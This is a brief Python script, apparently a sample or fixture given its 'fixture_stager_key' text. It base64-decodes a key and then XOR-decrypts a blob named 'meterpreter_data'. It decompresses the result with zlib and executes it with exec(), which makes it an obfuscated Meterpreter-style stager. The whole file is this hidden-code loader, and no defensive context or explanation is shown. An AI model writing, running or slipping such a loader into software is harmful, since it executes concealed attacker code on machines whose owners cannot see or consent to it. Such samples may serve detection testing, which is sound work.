import base64
import zlib

key = base64.b64decode("Q1lCTntmaXh0dXJlX3N0YWdlcl9rZXl9")

data = base64.b64decode("O8VpZrGqQqkkWlwsEzwhSU6qJZeiKjU0DgiVGis2Pwj6AYDOEbjYSU5IONKkLlTyjJFuBNaDa3iU5mAp")
meterpreter_data = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

exec(zlib.decompress(meterpreter_data))
